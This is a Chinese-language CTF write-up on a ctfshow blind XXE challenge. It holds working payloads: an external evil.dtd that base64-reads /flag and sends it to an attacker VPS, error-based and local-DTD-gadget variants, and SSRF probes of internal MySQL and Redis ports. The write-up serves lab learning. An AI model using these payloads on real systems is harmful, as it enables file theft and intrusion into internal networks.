```
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: h1xa  
# @Date:   2021-01-07 12:59:52  
# @Last Modified by:   h1xa  
# @Last Modified time: 2021-01-07 13:36:47  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
error_reporting(0);  
libxml_disable_entity_loader(false);  
$xmlfile = file_get_contents('php://input');  
if(isset($xmlfile)){    $dom = new DOMDocument();    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);  
}  
highlight_file(__FILE__);
```
题目代码把回显去掉了
我们回想起之前我们做过xss题目，想到可以把信息带到个人公网ip服务器上。
于是我们尝试构造xml注入：
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY test SYSTEM "http://你的vps地址:端口?flag=/flag">
]>
<note>&test</note>
```
然后在vps相应端口上开启 `python http server` 监听端口
```command
python -m http.server 端口
```
尝试注入后发现传过来的内容是 `flag=/flag`，可见xml没有按照预期将其解析。
于是我们修改 `/flag` 为 `file:///flag` ，结果传来的内容是 `flag=file:///flag`

询问AI后得知需要创建 `.dtd` 文件来处理请求
在你的vps上创建 `evil.dtd`
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://你的vps:端口/?d=%file;'>">
%oob;
```
(至于为什么需要%oob，请前往[[为什么要嵌套参数实体]])
然后在请求体里塞入xml
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % dtd SYSTEM "http://你的vps:端口/evil.dtd">
%dtd;
]>
<foo>&exfil;</foo>
```
发送请求后发现vps成功接收到了base64编码后的flag
```
你的请求                目标服务器                      你的 VPS:端口
    │                         │                                │
    │──POST XML payload ──►   │                                │
    │                         │──GET /evil.dtd ──────────────► │
    │                         │◄──返回 evil.dtd ───────────────│
    │                         │  解析 DTD，读取 /flag           │
    │                         │  base64 编码内容                │
    │                         │──GET /?d=base64(flag内容) ───► │
```

详细解释请参见[[ctfshow374OOB_HTTP外带]]，模板请参考[[OOB套装]]

----
当然这道题还有别的解法
### 比如 #报错外带
```
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'file:///nonexistent/%file;'>">
%oob;
```

### 比如 #本地DTD文件Gadget
服务器上本身就存在一些系统 DTD 文件，可以利用它们做**实体重定义**来触发报错。
```
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamsa '
    <!ENTITY %% file SYSTEM "file:///flag">
    <!ENTITY %% oob "<!ENTITY exfil SYSTEM \'file:///%%file;\'>">
    %%oob;
  '>
  %local_dtd;
]>
```
原理是覆盖系统 DTD 里已定义的参数实体，绕过"内部子集不能嵌套"的限制。

## 比如 #ssrf打内网
XXE 的本质是让服务器发请求，目标不一定是你的 VPS，可以是**内网服务**：
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<foo>&xxe;</foo>
```
如果有回显就能直接读内网页面内容。配合端口扫描探测内网拓扑：
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">  <!-- 探测 MySQL -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">  <!-- 探测 Redis -->
```
